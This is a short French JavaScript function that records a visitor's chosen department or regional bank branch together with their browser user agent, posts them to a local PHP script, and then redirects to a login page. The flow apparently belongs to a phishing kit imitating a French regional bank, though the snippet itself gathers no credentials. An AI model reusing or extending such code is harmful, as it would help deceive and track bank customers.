function region_log(){
var reg;	
var region_number =	$("#region_number").val();
var region_caisse	 =	$("#region_caisse").val();
	
	
 if(region_number=='' && region_caisse==''){

swal({
icon: 'error',
title: 'Erreur !',
text: "saisissez votre département ou sélectionnez votre caisse régionale"

})	

return false;	
} 
region_number!='' ? reg = region_number : reg = region_caisse;




 var data_log = 
{
DEVICE  : navigator.userAgent,
REGION	: reg
}; 


var _url = './config/data_reg.php';

$.post(_url,data_log,function(data){
 var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	


     window.location="./login.html";
    

    

} 


}) 
}